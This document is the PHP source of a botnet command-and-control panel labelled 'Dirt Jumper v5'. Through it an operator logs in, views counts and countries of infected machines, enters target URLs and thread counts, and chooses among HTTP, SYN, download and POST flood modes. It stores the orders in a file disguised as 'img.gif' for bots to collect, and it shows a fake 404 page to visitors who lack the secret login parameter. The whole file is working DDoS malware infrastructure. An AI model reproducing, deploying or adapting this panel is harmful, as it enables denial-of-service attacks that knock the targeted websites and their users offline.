<?
	if ($_GET['a']=='exit') {
		setcookie("dj","exit", time()+8640000);
		echo "</script><meta http-equiv='REFRESH' CONTENT='0;URL=index.php'>";
	}
function user_geo_ip($ip, $id) {
		include_once("geo_ip.php");
		$geoip = geo_ip::getInstance("geo_ip.dat");
		if ($id == 1) {
			$cont = $geoip->lookupCountryCode($ip);
		} elseif ($id == 2) {
			$cont = $geoip->lookupCountryName($ip);
		} elseif ($id == 3) {
			$name = $geoip->lookupCountryName($ip);
			$img = str_replace(" ", "_", strtolower($name));
			if (file_exists("img/".$img.".png")) {
				$cont = "<img src=\"img/".$img.".png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\">";
			} else {
				$cont = "<img src=\"img/question.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\">";
			}
		} elseif ($id == 4) {
			$name = $geoip->lookupCountryName($ip);
			$img = str_replace(" ", "_", strtolower($name));
			if (file_exists("img/".$img.".png")) {
				$cont = "<img src=\"img/".$img.".png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\"> $ip";
			} else {
				$cont = "<img src=\"img/question.png\" border=\"0\" align=\"center\" alt=\"".$lang[$conf['lang']]['table_country'].": ".$name."\" title=\"".$lang[$conf['lang']]['table_country'].": ".$name."\"> $ip";
			}
		}
		return $cont;
}
	include"core.php";
	include"config.php";
	if ($_GET['login']!=$GET_login) {
		if ($_GET['login']=='') {
			$folder=$folder."admin.php";
		} else {
			$folder=$folder."admin.php?login=".$_GET['login'];
		}
		include"404.php";
	}
	include"aut.php";
	if (($l<>1)and($_GET['new'])!=1) {
		echo '<meta http-equiv="REFRESH" CONTENT="0;URL=admin.php?login='.$GET_login.'&new=1">';
		exit;
	}
	echo'<html>
<head>
<title>Dirt Jumper v5</title>
<link rel="stylesheet" type="text/css" href="dj.css">
<body class=mybody>';
	if ($l<>1) {
		echo'
<center>
<form action="login.php" method="POST" align="center">
<br>
<table class="aut">
 <tr>
  <td colspan="2" align="center" bgcolor="#3F3F3F">
  <b>CnC</b>
 <tr>
  <td>Login:<td><input style="width:250px" type="text" name="login">
 <tr>
  <td>Password:<td><input style="width:250px" type="password" name="pass">
 <tr>
   <td colspan="2" align="center"><input type="submit" value="OK" style="width:100%">
</table>

</center>
		</form>
		';
	} else {
		echo'
<center>
<table class=panel><tr><td>
<a class=btn href=admin.php?login='.$GET_login.'>&nbsp;Home&nbsp;</a>
<a class=btn href=admin.php?login='.$GET_login.'&a=s_today>&nbsp;Statistic&nbsp;</a>
<a class=btn href=admin.php?login='.$GET_login.'&a=exit>&nbsp;Exit&nbsp;</a>
</td></tr></table>
';
if ($_GET['a']=='') {
echo'
<center>
<table class="panel" style="width: 75%"><tr><td style="width: 100%">
<center><h3>CnC</h3></center>
</td></tr><tr><td style="width: 100%">';
	$time = time();
	mysql_query("delete from `n` where `n`<$time-$interval-1 ");
	$sql = mysql_query("select `n` from `n` ");
	$num_rows = mysql_num_rows($sql);
	$n = $num_rows;
	mysql_query("delete from `td` where `time`<$time-86399 ");
	$sql = mysql_query("select `time` from `td` ");
	$num_rows = mysql_num_rows($sql);
	$td=$num_rows;
	$file_handle = fopen("img.gif", "r");
	while (!feof($file_handle)) {
		$line = $line.fgets($file_handle);
	}
	fclose($file_handle);
	if (strpos($line,']')!=0) {
		$url_load=substr($line,1,strpos($line,']')-1);
		$line=str_replace('['.$url_load.']','',$line);
		$id=substr($line,1,strpos($line,']')-1);
		$line=str_replace('['.$id.']','',$line);
	}
	$stop=substr($line,0,1);
$modes=substr($line,1,1);
if ($modes==1) {
$sel1='selected="selected" ';
}
if ($modes==2) {
$sel2='selected="selected" ';
}
if ($modes==3) {
$sel3='selected="selected" ';
}
if ($modes==4) {
$sel4='selected="selected" ';
}
if ($modes==5) {
$sel5='selected="selected" ';
}
	$flows=substr($line,3,3)+0;
	$i=str_replace($stop.$modes.'|'.$flows.'|','',$line)+0;
	$str = strpos($line,'{');
	if ($str > 0) {
		$str2 = strpos($line,'}');
		$load=substr($line,$str+1,$str2-$str-1);
	}
	if ($load <> '') {
		$l = '{'.$load.'}';
	} else {
		$l = '';
	}
	$url=str_replace($stop.$modes.'|'.$flows.'|'.$i.$l,'',$line);
	if ($_GET['info'] <> '') {
		$id = $_POST['id'];
		$url_load = $_POST['url_load'];
		$a1 = $_GET['info'];
		$a2 = $_POST['flows']; $a2 = $a2 + 0;
		$a4 = $_POST['url'];
		$a5 = $interval;
$modes = $_POST['mode'];
		if ($_POST['ok'] <> '') { $stop = $_GET['info']; }
		if ($stop == '') { $stop = 1; }
		$code = $stop.$modes.'|'.$a2.'|'.$a5.$a6.$a4;
		if (($id != '')and($url_load != '')) {
			$code = '['.$url_load.']['.$id.']'.$code;
		} 
  		$file = fopen ("img.gif","w+");
  		if ( !$file ) {
    			echo("Error open file");
			exit;
		} else {
			fputs ( $file, $code);
  		}
 		fclose ($file);
		echo '<META HTTP-EQUIV="REFRESH" CONTENT="0; URL=admin.php?login='.$GET_login.'">';
		exit;
	}
	if ($stop==1) {
		echo '<form action="admin.php?login='.$GET_login.'&info=0" method=post>';
		$s3 = 'Start';
	} else {
		echo '<form action="admin.php?login='.$GET_login.'&info=1" method=post>';
		$s3 = 'Stop';
	}
		$onl = 'Time: <b><font color=#FF5E5E>'.date("H:i:s").'</font></b><br>Today: <b><a href="admin.php?login='.$GET_login.'&a=s_today"><font color=#DD0000>'.$td.'</font></a></b><br>Online: <b><a href="admin.php?login='.$GET_login.'&a=s_online"><font color=#DD0000>'.$n.'</font></a></b>';
	echo '<center>'.$onl.'<table border="0" style="width: 80%"><tr><td style="width: 100%">URLs:</td><tr/><tr><td width=350><textarea rows="7" style="width: 100%" name="url">'.$url.'</textarea></td></tr><tr><td  style="width: 100%"><center>
Flows: <input name="flows" value="'.$flows.'" type=text maxlength="3" size="4">
<select name="mode">
 <option '.$sel5.'value="5">Anti DDoS flood</option>          
<option '.$sel1.'value="1">HTTP flood</option>
          <option '.$sel2.'value="2">Synchronous flood</option>
          <option '.$sel3.'value="3">Downloading flood</option>
          <option '.$sel4.'value="4">POST flood</option>

      </select>
</center></td></tr><tr><td width=350><input name="ok" value="'.$s3.'" type=submit  size="50" style="width: 50%" ><input name="save" value="Save" type=submit style="width: 50%" ></td></tr></table></center><br>';
		echo'</td></tr></table>';
		echo'</center>';
}
if ($_GET['a']=='s_today') {
echo'
<center>
<table class="panel" style="width: 75%"><tr><td style="width: 100%">
<center>';
	$time2 = time();
	mysql_query("delete from `td` where `time`<$time2-86399 ");
	$query = "SELECT * FROM `td`";
	$res = mysql_query($query) or die(mysql_error());
	$number = mysql_num_rows($res);
	echo 'All: '.$number;
	echo '<br>';
  	while ($row=mysql_fetch_array($res)) {
		$ip = $row['ip2'];
		$geo=user_geo_ip($ip,1);
		$stat[$geo]=$stat[$geo]+1;
		$stat2[$geo]=$ip;
  	}
	arsort($stat);
	reset($stat);
	foreach($stat as $i => $geo){ 
		echo '<small>'.user_geo_ip($stat2[$i],3).' '.$stat[$i].'</small>';
		echo '<br>';
	}
echo'</center>
</td></tr></table>
</center>
';
}
if ($_GET['a']=='s_online') {
echo'
<center>
<table class="panel" style="width: 75%"><tr><td style="width: 100%">
<center>';
	$time = time()-$interval-1;
	mysql_query("delete from `n` where `n`<$time-$interval-1 ");
	$sql = mysql_query("select `n` from `n` ");
	mysql_query("delete from `n` where `n`<$time");
	$query = "select `ip` from `n` ";
	$res = mysql_query($query) or die(mysql_error());
	$number = mysql_num_rows($res);
	echo 'All: '.$number;
	echo '<br>';
  	while ($row=mysql_fetch_array($res)) {
		$ip = $row['ip'];
		$geo=user_geo_ip($ip,1);
		$stat[$geo]=$stat[$geo]+1;
		$stat2[$geo]=$ip;
  	}
	arsort($stat);
	reset($stat);
	foreach($stat as $i => $geo){ 
		echo '<small>'.user_geo_ip($stat2[$i],3).' '.$stat[$i].'</small>';
		echo '<br>';
	}
echo'</center>
</td></tr></table>
</center>
';
}
	}
echo'
</body>
</head>
</html>
';
?>